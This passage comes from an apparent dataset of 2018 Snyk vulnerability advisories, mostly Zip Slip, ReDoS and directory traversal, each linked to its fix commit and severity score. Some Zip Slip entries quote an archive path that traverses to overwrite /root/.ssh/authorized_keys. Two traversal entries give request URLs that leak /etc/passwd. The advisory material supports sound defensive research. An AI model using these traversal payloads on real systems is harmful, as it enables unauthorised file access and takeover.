+2018-04-15 22:04:42 ..... 20 20 ../../../../../../root/.ssh/authorized_keys",2018
CVE-2018-1002201,CWE-29,Snyk,https://security.snyk.io/vuln/SNYK-JAVA-ORGZEROTURNAROUND-31681,31/05/2018,18/04/2018,https://github.com/zeroturnaround/zt-zip/commit/759b72f33bc8f4d69f84f09fcb7f010ad45d6fff,Arbitrary File Write via Archive Extraction (Zip Slip),https://api.github.com/repos/zeroturnaround/zt-zip/commits/759b72f33bc8f4d69f84f09fcb7f010ad45d6fff,Toomas Romer,toomas@zeroturnaround.com,zt-zip,759b72f33bc8f4d69f84f09fcb7f010ad45d6fff,"Fixed potential security vulnerability reported by Snyk Security Research Team

This is an arbitrary file write vulnerability, that can be achieved using a specially crafted zip archive, that holds path traversal filenames. So when the filename gets concatenated to the target extraction directory, the final path ends up outside of the target folder.",Java,5.5,medium,"org.zeroturnaround:zt-zip is a library that helps to create, modify or extract ZIP archives.
Affected versions of the package are vulnerable to Arbitrary File Write via Archive Extraction (AKA ""Zip Slip"").
It is exploited using a specially crafted zip archive, that holds path traversal filenames. When exploited, a filename in a malicious archive is concatenated to the target extraction directory, which results in the final path ending up outside of the target folder. For instance, a zip may hold a file with a ""../../file.exe"" location and thus break out of the target folder. If an executable or a configuration file is overwritten with a file containing malicious code, the problem can turn into an arbitrary code execution issue quite easily.
The following is an example of a zip archive with one benign file and one malicious file. Extracting the malicous file will result in traversing out of the target folder, ending up in /root/.ssh/ overwriting the authorized_keys file:

+2018-04-15 22:04:29 ..... 19 19 good.txt

+2018-04-15 22:04:42 ..... 20 20 ../../../../../../root/.ssh/authorized_keys",2018
CVE-2018-1002200,CWE-29,Snyk,https://security.snyk.io/vuln/SNYK-JAVA-ORGCODEHAUSPLEXUS-31680,31/05/2018,18/04/2018,https://github.com/codehaus-plexus/plexus-archiver/commit/f8f4233508193b70df33759ae9dc6154d69c2ea8,Arbitrary File Write via Archive Extraction (Zip Slip),https://api.github.com/repos/codehaus-plexus/plexus-archiver/commits/f8f4233508193b70df33759ae9dc6154d69c2ea8,Karl Heinz Marbaise,github@soebes.de,plexus-archiver,f8f4233508193b70df33759ae9dc6154d69c2ea8,"Merge pull request #87 from odinn1984/fix/fail_on_outside_target_files

fix: fail when trying to extract outside of dest dir",Java,5.5,medium,"org.codehaus.plexus:plexus-archiver is a Collection of Plexus components to create archives or extract files out of an archive to a directory with a unified Archiver/UnArchiver API whatever the archive format is.
Affected versions of the package are vulnerable to Arbitrary File Write via Archive Extraction (AKA ""Zip 
Slip"").
It is exploited using a specially crafted zip archive, that holds path traversal filenames. When exploited, a filename in a malicious archive is concatenated to the target extraction directory, which results in the final path ending up outside of the target folder. For instance, a zip may hold a file with a ""../../file.exe"" location and thus break out of the target folder. If an executable or a configuration file is overwritten with a file containing malicious code, the problem can turn into an arbitrary code execution issue quite easily.
The following is an example of a zip archive with one benign file and one malicious file. Extracting the malicous file will result in traversing out of the target folder, ending up in /root/.ssh/ overwriting the authorized_keys file:

+2018-04-15 22:04:29 ..... 19 19 good.txt

+2018-04-15 22:04:42 ..... 20 20 ../../../../../../root/.ssh/authorized_keys",2018
CVE-2018-1002207,CWE-29,Snyk,https://security.snyk.io/vuln/SNYK-GOLANG-GITHUBCOMMHOLTARCHIVERCMDARCHIVER-50071,31/05/2018,14/04/2018,https://github.com/mholt/archiver/commit/e4ef56d48eb029648b0e895bb0b6a393ef0829c3,Arbitrary File Write via Archive Extraction (Zip Slip),https://api.github.com/repos/mholt/archiver/commits/e4ef56d48eb029648b0e895bb0b6a393ef0829c3,aviadatsnyk,aviad@snyk.io,archiver,e4ef56d48eb029648b0e895bb0b6a393ef0829c3,"fix: prevent extraction of archived files outside target path (#65)

* fix: prevent extraction of archived files outside target path

* CR: consolidate the path sanitaiton logic",Go,5.5,medium,"github.com/mholt/archiver/cmd/archiver makes it trivially easy to make and extract common archive formats such as .zip, and .tar.gz. Simply name the input and output file(s).
Affected versions of the package are vulnerable to Arbitrary File Write via Archive Extraction (AKA ""Zip Slip"").
It is exploited using a specially crafted zip archive, that holds path traversal filenames. When exploited, a filename in a malicious archive is concatenated to the target extraction directory, which results in the final path ending up outside of the target folder. For instance, a zip may hold a file with a ""../../file.exe"" location and thus break out of the target folder. If an executable or a configuration file is overwritten with a file containing malicious code, the problem can turn into an arbitrary code execution issue quite easily.
The following is an example of a zip archive with one benign file and one malicious file. Extracting the malicous file will result in traversing out of the target folder, ending up in /root/.ssh/ overwriting the authorized_keys file:

+2018-04-15 22:04:29 ..... 19 19 good.txt

+2018-04-15 22:04:42 ..... 20 20 ../../../../../../root/.ssh/authorized_keys",2018
,CWE-400,Snyk,https://security.snyk.io/vuln/npm:content:20180305,05/03/2018,05/03/2018,https://github.com/hapijs/content/commit/96beb34f7c38a08d024dbf9cd63865c56e2955d9,Regular Expression Denial of Service (ReDoS),https://api.github.com/repos/hapijs/content/commits/96beb34f7c38a08d024dbf9cd63865c56e2955d9,Eran Hammer,eran@hammer.io,content,96beb34f7c38a08d024dbf9cd63865c56e2955d9,Simplify content type header processing,JavaScript,7.5,high,"content is a HTTP Content-* headers parsing
Affected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) attacks. An attacker may pass a specially crafted Content-Type or Content-Disposition header, causing the server to hang. This can cause an impact of about 10 seconds matching time for data 180 characters long.",2018
,CWE-400,Snyk,https://security.snyk.io/vuln/npm:uas-parser:20180305,05/03/2018,05/03/2018,https://github.com/GUI/uas-parser/commit/c33b1247d02244484c78d1cb06a7103156f17109,Regular Expression Denial of Service (ReDoS),https://api.github.com/repos/GUI/uas-parser/commits/c33b1247d02244484c78d1cb06a7103156f17109,Nick Muerdter,nick.muerdter@nrel.gov,uas-parser,c33b1247d02244484c78d1cb06a7103156f17109,"Change how regex DoS is fixed by truncating search to first 1000 chars.

This approach should still solve the underlying issue, but in a slightly
more backwards compatible way, so we can get by more easily with
shipping this as a patch release (since there do seem to be some longer
user agents floating out there).",JavaScript,7.1,high,"uas-parser is a User agent string parser (using data from user-agent-string.info)
Affected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) attacks. This can cause an impact of about 10 seconds matching time for data 45 characters long.",2018
,CWE-400,Snyk,https://security.snyk.io/vuln/npm:nwmatcher:20180305,05/03/2018,05/03/2018,https://github.com/dperini/nwmatcher/commit/9dcc2b039beeabd18327a5ebaa537625872e16f0,Regular Expression Denial of Service (ReDoS),https://api.github.com/repos/dperini/nwmatcher/commits/9dcc2b039beeabd18327a5ebaa537625872e16f0,Diego Perini,diego.perini@gmail.com,nwmatcher,9dcc2b039beeabd18327a5ebaa537625872e16f0,changed instances of \s* with \s? in regular expressions to reduce the risk of potential catastrophic backtracking vulnerability (audit courtesy of James Davis),JavaScript,3.7,low,"nwmatcher is a fast CSS selector engine and matcher.
Affected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS). This can cause an impact of about 10 seconds matching time for data 2k characters long.",2018
CVE-2018-3738,CWE-400,Snyk,https://security.snyk.io/vuln/npm:protobufjs:20180305,05/03/2018,05/03/2018,https://github.com/dcodeIO/protobuf.js/commit/2ee1028d631a328e152d7e09f2a0e0c5c83dc2aa,Regular Expression Denial of Service (ReDoS),https://api.github.com/repos/dcodeIO/protobuf.js/commits/2ee1028d631a328e152d7e09f2a0e0c5c83dc2aa,dcodeIO,dcode@dcode.io,protobuf.js,2ee1028d631a328e152d7e09f2a0e0c5c83dc2aa,Security: Fix typeRefRe being vulnerable to ReDoS,JavaScript,7.1,high,"protobufjs is a Protocol Buffers for JavaScript (& TypeScript).
Affected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) attacks. This can cause an impact of about 10 seconds matching time for data 45 characters long.",2018
CVE-2018-20801,CWE-400,Snyk,https://security.snyk.io/vuln/npm:highcharts:20180225,01/03/2018,01/03/2018,https://github.com/highcharts/highcharts/commit/7c547e1e0f5e4379f94396efd559a566668c0dfa,Regular Expression Denial of Service (ReDoS),https://api.github.com/repos/highcharts/highcharts/commits/7c547e1e0f5e4379f94396efd559a566668c0dfa,Torstein Hønsi,torstein@highsoft.com,highcharts,7c547e1e0f5e4379f94396efd559a566668c0dfa,"Refactored SVGRenderer text to not use backtracking regexes to replace attributes.

Adds support for single quoted class, href and style attributes in strings.",JavaScript,7.1,high,"highcharts is a JavaScript charting library based on SVG, with fallbacks to VML and canvas for old browsers.
Affected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS). This can cause an impact of about 10 seconds matching time for data 200K characters long.",2018
,CWE-400,Snyk,https://security.snyk.io/vuln/npm:wicket:20180225,27/02/2018,27/02/2018,https://github.com/arthur-e/Wicket/commit/aa4a3bc1ec50c55c06ea4faf11dd36d2623ac4a2,Regular Expression Denial of Service (ReDoS),https://api.github.com/repos/arthur-e/Wicket/commits/aa4a3bc1ec50c55c06ea4faf11dd36d2623ac4a2,K. Arthur Endsley,kaendsle@mtu.edu,Wicket,aa4a3bc1ec50c55c06ea4faf11dd36d2623ac4a2,"Merge pull request #122 from davisjam/FixCatastrophicBacktracking

Security: Fix catastrophic backtracking",JavaScript,3.7,low,"wicket is a modest library for moving between Well-Known Text (WKT) and various framework geometries
Affected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) attacks. This can cause an impact of about 10 seconds matching time for data 150K characters long.",2018
,CWE-400,Snyk,https://security.snyk.io/vuln/npm:eslint:20180222,22/03/2018,23/02/2018,https://github.com/eslint/eslint/commit/f6901d0bcf6c918ac4e5c6c7c4bddeb2cb715c09,Regular Expression Denial of Service (ReDoS),https://api.github.com/repos/eslint/eslint/commits/f6901d0bcf6c918ac4e5c6c7c4bddeb2cb715c09,Jamie Davis,davisjam@vt.edu,eslint,f6901d0bcf6c918ac4e5c6c7c4bddeb2cb715c09,"Fix: remove catastrophic backtracking vulnerability (fixes #10002) (#10019)

Change template substitution regex to exclude fields with whitespace.
This addresses possible O(n^2) catastrophic backtracking behavior.

Very unlikely to be exploited. For #10002.",JavaScript,3.7,low,"eslint is a pluggable linting utility for JavaScript and JSX
Affected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS). This can cause an impact of about 10 seconds matching time for data 100k characters long.",2018
CVE-2018-1002204,CWE-29,Snyk,https://security.snyk.io/vuln/npm:adm-zip:20180415,31/05/2018,15/04/2018,https://github.com/cthackers/adm-zip/commit/d01fa8c80c3a5fcf5ce1eda82d96600c62910d3f,Arbitrary File Write via Archive Extraction (Zip Slip),https://api.github.com/repos/cthackers/adm-zip/commits/d01fa8c80c3a5fcf5ce1eda82d96600c62910d3f,File Formats,sy@another-d-mention.ro,adm-zip,d01fa8c80c3a5fcf5ce1eda82d96600c62910d3f,Fixed bugs introduced with 0.4.9,Unknown,9.4,critical,"adm-zip is a JavaScript implementation for zip data compression for NodeJS.
Affected versions of this package are vulnerable to Arbitrary File Write via Archive Extraction (Zip Slip).",2018
,CWE-400,Snyk,https://security.snyk.io/vuln/npm:citation-js:20180508,16/05/2018,08/05/2018,https://github.com/larsgw/citation.js/commit/fa7cb324270f81ed626d45f2aca8a215dfa5104e,Regular Expression Denial of Service (ReDoS),https://api.github.com/repos/larsgw/citation.js/commits/fa7cb324270f81ed626d45f2aca8a215dfa5104e,Lars Willighagen,lars.willighagen@gmail.com,citation.js,fa7cb324270f81ed626d45f2aca8a215dfa5104e,"[output] Fix flagged REDOS regex

Fix some of the regexes flagged by the eslint
REDOS plugin.

See #107",JavaScript,7.5,high,"citation-js converts formats like BibTeX, Wikidata JSON and ContentMine JSON to CSL-JSON to convert to other formats like APA, Vancouver and back to BibTeX.
Affected versions of the package are vulnerable to Regular Expression Denial of Service (ReDoS). This can cause an impact of about 10 seconds matching time for data 13 characters long.",2018
CVE-2018-1263,CWE-22,Snyk,https://security.snyk.io/vuln/SNYK-JAVA-ORGSPRINGFRAMEWORKINTEGRATION-32275,16/05/2018,16/05/2018,https://github.com/spring-projects/spring-integration-extensions/commit/d10f537283d90eabd28af57ac97f860a3913bf9b,Arbitrary File Write via Archive Extraction (Zip Slip),https://api.github.com/repos/spring-projects/spring-integration-extensions/commits/d10f537283d90eabd28af57ac97f860a3913bf9b,Gary Russell,grussell@pivotal.io,spring-integration-extensions,d10f537283d90eabd28af57ac97f860a3913bf9b,"Dissallow traversal entry even for byte[]

The previous change prevents the transformer from writing a file outside of
the working directory.

However it still produced an entry for an errant file when producing just contents,
and not writing to the file system. However, the errant path would be added to the
message and might be used by subsequent components to write to the file system.

This situation is present in the `UnZip2FileTests`.

While this vulnerability is not directly exposed by the framework, user applications
could be affected by it.",Java,4.7,medium,"org.springframework.integration:spring-integration-zip provides Zip (un-) compression support.
Affected versions of the package are vulnerable to Arbitrary File Write via Archive Extraction (AKA ""Zip Slip"").
It is exploited using a specially crafted zip archive, that holds path traversal filenames. When exploited, a filename in a malicious archive is concatenated to the target extraction directory, which results in the final path ending up outside of the target folder. For instance, a zip may hold a file with a ""../../file.exe"" location and thus break out of the target folder. If an executable or a configuration file is overwritten with a file containing malicious code, the problem can turn into an arbitrary code execution issue quite easily.
The following is an example of a zip archive with one benign file and one malicious file. Extracting the malicous file will result in traversing out of the target folder, ending up in /root/.ssh/ overwriting the authorized_keys file:

+2018-04-15 22:04:29 ..... 19 19 good.txt

+2018-04-15 22:04:42 ..... 20 20 ../../../../../../root/.ssh/authorized_keys",2018
CVE-2018-1261,CWE-22,Snyk,https://security.snyk.io/vuln/SNYK-JAVA-ORGSPRINGFRAMEWORKINTEGRATION-31675,10/05/2018,09/05/2018,https://github.com/spring-projects/spring-integration-extensions/commit/a5573eb232ff85199ff9bb28993df715d9a19a25,Arbitrary File Write via Archive Extraction (Zip Slip),https://api.github.com/repos/spring-projects/spring-integration-extensions/commits/a5573eb232ff85199ff9bb28993df715d9a19a25,Artem Bilan,abilan@pivotal.io,spring-integration-extensions,a5573eb232ff85199ff9bb28993df715d9a19a25,"Disallow traversal entity in zip

When the file name holds path traversal file names it gets
concatenated to the target extraction directory,
the final path ends up outside of the target folder.",Config files,4.7,medium,"org.springframework.integration:spring-integration-zip provides Zip (un-) compression support.
Affected versions of the package are vulnerable to Arbitrary File Write via Archive Extraction (AKA ""Zip Slip"").
It is exploited using a specially crafted zip archive, that holds path traversal filenames. When exploited, a filename in a malicious archive is concatenated to the target extraction directory, which results in the final path ending up outside of the target folder. For instance, a zip may hold a file with a ""../../file.exe"" location and thus break out of the target folder. If an executable or a configuration file is overwritten with a file containing malicious code, the problem can turn into an arbitrary code execution issue quite easily.
The following is an example of a zip archive with one benign file and one malicious file. Extracting the malicous file will result in traversing out of the target folder, ending up in /root/.ssh/ overwriting the authorized_keys file:

+2018-04-15 22:04:29 ..... 19 19 good.txt

+2018-04-15 22:04:42 ..... 20 20 ../../../../../../root/.ssh/authorized_keys",2018
,CWE-400,Snyk,https://security.snyk.io/vuln/npm:ua-parser-js:20180227,02/05/2018,27/02/2018,https://github.com/faisalman/ua-parser-js/commit/2e57a9778f0735a1e5e73e723155e155848a88af,Regular Expression Denial of Service (ReDoS),https://api.github.com/repos/faisalman/ua-parser-js/commits/2e57a9778f0735a1e5e73e723155e155848a88af,Faisal Salman,fyzlman@gmail.com,ua-parser-js,2e57a9778f0735a1e5e73e723155e155848a88af,"Merge pull request #299 from zbjornson/vulnfix

Fix vulnerable RegExps",JavaScript,5.3,medium,"ua-parser-js is Lightweight JavaScript-based user-agent string parser.
Affected versions of the package are vulnerable to Regular Expression Denial of Service (ReDoS).",2018
,CWE-522,Snyk,https://security.snyk.io/vuln/npm:safe-compare:20180417,17/04/2018,21/02/2018,https://github.com/Bruce17/safe-compare/commit/9f51dd99ee1151aed8d68d91cea92ab89a1390c8,Insecure Credential Comparison,https://api.github.com/repos/Bruce17/safe-compare/commits/9f51dd99ee1151aed8d68d91cea92ab89a1390c8,aviadatsnyk,aviad@snyk.io,safe-compare,9f51dd99ee1151aed8d68d91cea92ab89a1390c8,"fix: buffer-alloc pads a buffer by repeating (#1)

* fix: buffer-alloc pads a buffer by repeating

* add a test",JavaScript,6.5,medium,"safe-compare is a constant-time comparison algorithm to prevent timing attacks..
Affected versions of the package are vulnerable to Insecure Credential Comparison. It used the bufferAlloc constructor incorrectly, which caused the password string to be ""padded"" with itself. This means that the passwords ""a"" and ""aaaaaaaaaaaaa"" would be equal.",2018
,CWE-400,Snyk,https://security.snyk.io/vuln/npm:plist:20180219,15/04/2018,15/04/2018,https://github.com/TooTallNate/plist.js/commit/a85b9d3559859d58e44d099a6a40bf8c13ab7e66,Regular Expression Denial of Service (ReDoS),https://api.github.com/repos/TooTallNate/plist.js/commits/a85b9d3559859d58e44d099a6a40bf8c13ab7e66,Mike Reinstein,reinstein.mike@gmail.com,plist.js,a85b9d3559859d58e44d099a6a40bf8c13ab7e66,3.0.0 closes #89,Markdown,7.1,high,"plist is a Mac OS X Plist parser/builder for Node.js and browsers
Affected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) attacks due to bundling a vulnerable version of the XMLBuilder package. This can cause an impact of about 10 seconds matching time for data 60 characters long.",2018
,CWE-400,Snyk,https://security.snyk.io/vuln/npm:ducktype:20180219,15/04/2018,15/04/2018,https://github.com/josdejong/ducktype/commit/d8b4c902598c9104d5c56225c3fffcbe1368eff6,Regular Expression Denial of Service (ReDoS),https://api.github.com/repos/josdejong/ducktype/commits/d8b4c902598c9104d5c56225c3fffcbe1368eff6,jos,wjosdejong@gmail.com,ducktype,d8b4c902598c9104d5c56225c3fffcbe1368eff6,Security fix in the regular expression for urls. Released version 1.2.1,Markdown,7.1,high,"ducktype is a Flexible data validation using a duck type interface
Affected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) attacks. This can cause an impact of about 10 seconds matching time for data 60 characters long.",2018
,CWE-400,Snyk,https://security.snyk.io/vuln/npm:simpl-schema:20180219,15/04/2018,15/04/2018,https://github.com/aldeed/simple-schema-js/commit/30c43688a38e49e17959d16e7b07131b502a7d1f,Regular Expression Denial of Service (ReDoS),https://api.github.com/repos/aldeed/simple-schema-js/commits/30c43688a38e49e17959d16e7b07131b502a7d1f,Eric Dobbertin,eric@dairystatedesigns.com,simple-schema-js,30c43688a38e49e17959d16e7b07131b502a7d1f,improve EmailWithTLD regular expression,JavaScript,7.1,high,"simpl-schema is a A schema validation package that supports direct validation of MongoDB update modifier objects.
Affected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) attacks. This can cause an impact of about 10 seconds matching time for data 40k characters long.",2018
CVE-2018-13863,CWE-400,Snyk,https://security.snyk.io/vuln/npm:bson:20180225,27/02/2018,27/02/2018,https://github.com/mongodb/js-bson/commit/bd61c45157c53a1698ff23770160cf4783e9ea4a,Regular Expression Denial of Service (ReDoS),https://api.github.com/repos/mongodb/js-bson/commits/bd61c45157c53a1698ff23770160cf4783e9ea4a,Matt Broadstone,mbroadst@gmail.com,js-bson,bd61c45157c53a1698ff23770160cf4783e9ea4a,"fix(decimal128): add basic guard against REDOS attacks

This is a naive approach to reducing the efficacy of a REDOS attack
against this module. A refactor of the regular expression or a
custom parser substitute would be ideal, however this solution
suffices as a stopgap until such work is completed.

Many thanks to James Davis who graciously alterted us to the
attack",JavaScript,3.7,low,"bson is a BSON Parser for node and browser.
Affected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS). This can cause an impact of about 10 seconds matching time for data 50K characters long.",2018
CVE-2018-16485,CWE-22,Snyk,https://security.snyk.io/vuln/npm:m-server:20180226,26/02/2018,26/02/2018,https://github.com/nunnly/m-server/commit/01f13f040d1961ca3146dce7e2db990156e65e9a,Directory Traversal,https://api.github.com/repos/nunnly/m-server/commits/01f13f040d1961ca3146dce7e2db990156e65e9a,hawk,whktk@qq.com,m-server,01f13f040d1961ca3146dce7e2db990156e65e9a,fix a bug and update test,JavaScript,7.5,high,"m-server is a M-Server is a mini http static server that without any dependencies;.
Affected versions of the package are vulnerable to Directory Traversal, which may allow access to sensitive files and data on the server. For example, requesting the following url /..%2f..%2fetc/passwd would result in /etc/passwd leak.",2018
,CWE-400,Snyk,https://security.snyk.io/vuln/SNYK-JAVA-IOKONIG-538608,06/03/2018,05/03/2018,https://github.com/kpdecker/jsdiff/commit/2aec4298639bf30fb88a00b356bf404d3551b8c0,Regular Expression Denial of Service (ReDoS),https://api.github.com/repos/kpdecker/jsdiff/commits/2aec4298639bf30fb88a00b356bf404d3551b8c0,Kevin Decker,kpdecker@gmail.com,jsdiff,2aec4298639bf30fb88a00b356bf404d3551b8c0,Optimize parch header parser,JavaScript,7.1,high,"io.konig:diff is a javascript text differencing implementation.
Affected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS). This can cause an impact of about 10 seconds matching time for data 48K characters long.",2018
,CWE-400,Snyk,https://security.snyk.io/vuln/npm:clean-css:20180306,07/03/2018,06/03/2018,https://github.com/jakubpawlowicz/clean-css/commit/2929bafbf8cdf7dccb24e0949c70833764fa87e3,Regular Expression Denial of Service (ReDoS),https://api.github.com/repos/jakubpawlowicz/clean-css/commits/2929bafbf8cdf7dccb24e0949c70833764fa87e3,Jakub Pawlowicz,contact@jakubpawlowicz.com,clean-css,2929bafbf8cdf7dccb24e0949c70833764fa87e3,"Fixes ReDOS vulnerabilities.

Jamie Davis (@davisjam) from Virginia Tech reported that clean-css
suffers from ReDOS vulnerability [0] when fed with crafted input.

Since not so many people use clean-css allowing untrusted input such
cases may be rare, but this commit reworks vulnerable code to prevent
such attacks.

It also limits certain whitespace blocks to sane length of 31 characters
in validation regexes to prevent similar issues.

[0] https://snyk.io/blog/redos-and-catastrophic-backtracking",Markdown,3.7,low,"clean-css is a fast and efficient CSS optimizer for Node.js platform and any modern browser.
Affected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS).
attacks. This can cause an impact of about 10 seconds matching time for data 70k characters long.",2018
,CWE-400,Snyk,https://security.snyk.io/vuln/npm:diff:20180305,06/03/2018,05/03/2018,https://github.com/kpdecker/jsdiff/commit/2aec4298639bf30fb88a00b356bf404d3551b8c0,Regular Expression Denial of Service (ReDoS),https://api.github.com/repos/kpdecker/jsdiff/commits/2aec4298639bf30fb88a00b356bf404d3551b8c0,Kevin Decker,kpdecker@gmail.com,jsdiff,2aec4298639bf30fb88a00b356bf404d3551b8c0,Optimize parch header parser,JavaScript,7.1,high,"diff is a javascript text differencing implementation.
Affected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS). This can cause an impact of about 10 seconds matching time for data 48K characters long.",2018
,CWE-400,Snyk,https://security.snyk.io/vuln/SNYK-JAVA-ORGGITHUBEVENJN-538607,06/03/2018,05/03/2018,https://github.com/kpdecker/jsdiff/commit/2aec4298639bf30fb88a00b356bf404d3551b8c0,Regular Expression Denial of Service (ReDoS),https://api.github.com/repos/kpdecker/jsdiff/commits/2aec4298639bf30fb88a00b356bf404d3551b8c0,Kevin Decker,kpdecker@gmail.com,jsdiff,2aec4298639bf30fb88a00b356bf404d3551b8c0,Optimize parch header parser,JavaScript,7.1,high,"org.github.evenjn:diff is a javascript text differencing implementation.
Affected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS). This can cause an impact of about 10 seconds matching time for data 48K characters long.",2018
,CWE-400,Snyk,https://security.snyk.io/vuln/SNYK-JAVA-COMSKSAMUELDIFF-538609,06/03/2018,05/03/2018,https://github.com/kpdecker/jsdiff/commit/2aec4298639bf30fb88a00b356bf404d3551b8c0,Regular Expression Denial of Service (ReDoS),https://api.github.com/repos/kpdecker/jsdiff/commits/2aec4298639bf30fb88a00b356bf404d3551b8c0,Kevin Decker,kpdecker@gmail.com,jsdiff,2aec4298639bf30fb88a00b356bf404d3551b8c0,Optimize parch header parser,JavaScript,7.1,high,"com.sksamuel.diff:diff is a javascript text differencing implementation.
Affected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS). This can cause an impact of about 10 seconds matching time for data 48K characters long.",2018
CVE-2018-3733,CWE-22,Snyk,https://security.snyk.io/vuln/npm:crud-file-server:20180226,26/02/2018,26/02/2018,https://github.com/omphalos/crud-file-server/commit/4fc3b404f718abb789f4ce4272c39c7a138c7a82,Directory Traversal,https://api.github.com/repos/omphalos/crud-file-server/commits/4fc3b404f718abb789f4ce4272c39c7a138c7a82,omphalos,omph.alos@yahoo.com,crud-file-server,4fc3b404f718abb789f4ce4272c39c7a138c7a82,Fix canonicalization of directories,JavaScript,7.5,high,"crud-file-server is a file server supporting basic create, read, update, & delete for any kind of file.
Affected versions of the package are vulnerable to Directory Traversal, which may allow access to sensitive files and data on the server. For example, requesting the following url /../../etc/passwd would result in /etc/passwd leak.",2018
,CWE-400,Snyk,https://security.snyk.io/vuln/npm:node-forge:20180226,26/02/2018,27/02/2018,https://github.com/digitalbazaar/forge/commit/8a2fd33f0cc3a57b15885fb9f976fc677896dd7a,Regular Expression Denial of Service (ReDoS),https://api.github.com/repos/digitalbazaar/forge/commits/8a2fd33f0cc3a57b15885fb9f976fc677896dd7a,Jamie Davis,davisjam@vt.edu,forge,8a2fd33f0cc3a57b15885fb9f976fc677896dd7a,"Fix catastrophic backtracking

One regex in this project was vulnerable
to catastrophic backtracking.

I have replaced it with a safe regex that matches
a nearly-equivalent language.
I believe this language is still correct for the expected input.",JavaScript,5.3,medium,"node-forge is a native implementation of TLS (and various other cryptographic tools) in JavaScript.
Affected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) attacks. This can cause an impact of about 10 seconds matching time for data 3K characters long.",2018
,CWE-400,Snyk,https://security.snyk.io/vuln/npm:node-json-db:20180226,26/02/2018,27/02/2018,https://github.com/Belphemur/node-json-db/commit/ca8d1d4edcde715be21f08c568a4ba17b5536010,Regular Expression Denial of Service (ReDoS),https://api.github.com/repos/Belphemur/node-json-db/commits/ca8d1d4edcde715be21f08c568a4ba17b5536010,Antoine Aflalo,antoine.aflalo@zerospam.ca,node-json-db,ca8d1d4edcde715be21f08c568a4ba17b5536010,"Rework the regex for Array parsing

Add cache to not have to run regex all the time.",JavaScript,5.3,medium,"node-json-db is a simple ""database"" that use JSON file for Node.JS.
Affected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) attacks. This can cause an impact of about 10 seconds matching time for data 3K characters long.",2018
,CWE-400,Snyk,https://security.snyk.io/vuln/npm:github-url-to-object:20180226,26/02/2018,27/02/2018,https://github.com/zeke/github-url-to-object/commit/c209cfaade9d5516b5ae81814c5d7b2a53571c90,Regular Expression Denial of Service (ReDoS),https://api.github.com/repos/zeke/github-url-to-object/commits/c209cfaade9d5516b5ae81814c5d7b2a53571c90,Zeke Sikelianos,zeke@github.com,github-url-to-object,c209cfaade9d5516b5ae81814c5d7b2a53571c90,"fix: Merge pull request #34 from davisjam/FixREDOS

Fix redos",JavaScript,3.7,low,"github-url-to-object is a module for node.js and browsers that extracts useful properties like user, repo, and branch from various flavors of GitHub URLs.
Affected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) attacks. This can cause an impact of about 10 seconds matching time for data 40K characters long.",2018
,CWE-400,Snyk,https://security.snyk.io/vuln/npm:mongoose-beautiful-unique-validation:20180226,26/02/2018,27/02/2018,https://github.com/matteodelabre/mongoose-beautiful-unique-validation/commit/3f2714b35a05977190468bf417a3fdbaaee344cc,Regular Expression Denial of Service (ReDoS),https://api.github.com/repos/matteodelabre/mongoose-beautiful-unique-validation/commits/3f2714b35a05977190468bf417a3fdbaaee344cc,Mattéo Delabre,contact@matteodelabre.me,mongoose-beautiful-unique-validation,3f2714b35a05977190468bf417a3fdbaaee344cc,Simplify regex to prevent catastrophic backtracking,JavaScript,5.3,medium,"mongoose-beautiful-unique-validation is a plugin for Mongoose that turns duplicate errors into regular Mongoose validation errors.
Affected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) attacks. This can cause an impact of about 10 seconds matching time for data 1K characters long.",2018
,CWE-400,Snyk,https://security.snyk.io/vuln/npm:compromise:20180226,26/02/2018,27/02/2018,https://github.com/spencermountain/compromise/commit/836f659d1cfe799fa10df7f7ea7450f935ec1a46,Regular Expression Denial of Service (ReDoS),https://api.github.com/repos/spencermountain/compromise/commits/836f659d1cfe799fa10df7f7ea7450f935ec1a46,spencermountain,spencermountain@gmail.com,compromise,836f659d1cfe799fa10df7f7ea7450f935ec1a46,comment-out dangerous regex,JavaScript,5.3,medium,"compromise is a ural-language processing package in javascript.
Affected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) attacks. This can cause an impact of about 10 seconds matching time for data 55K characters long.",2018
,CWE-400,Snyk,https://security.snyk.io/vuln/npm:git-username:20180226,26/02/2018,27/02/2018,https://github.com/jonschlinkert/git-username/commit/b4313b31a0d2b51105f96307d6306e150f3df80d,Regular Expression Denial of Service (ReDoS),https://api.github.com/repos/jonschlinkert/git-username/commits/b4313b31a0d2b51105f96307d6306e150f3df80d,Jon Schlinkert,dev@sellside.com,git-username,b4313b31a0d2b51105f96307d6306e150f3df80d,"Merge pull request #3 from davisjam/FixREDOS

Change pattern to avoid REDOS",JavaScript,3.7,low,"git-username is a package that gets the username from a git remote origin URL.
Affected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) attacks. This can cause an impact of about 10 seconds matching time for data 43K characters long.",2018
,CWE-400,Snyk,https://security.snyk.io/vuln/SNYK-PYTHON-DJANGOCACHEOPS-40772,25/02/2018,25/02/2018,https://github.com/Suor/django-cacheops/commit/adba2dc9908c50157d417fd7564669c11ed23b2a,Regular Expression Denial of Service (ReDoS),https://api.github.com/repos/Suor/django-cacheops/commits/adba2dc9908c50157d417fd7564669c11ed23b2a,Alexander Schepanovski,suor.web@gmail.com,django-cacheops,adba2dc9908c50157d417fd7564669c11ed23b2a,Fix catastrophic backtracking,Python,3.7,low,"django-cacheops is an app that supports automatic or manual queryset caching and automatic granular event-driven invalidation.
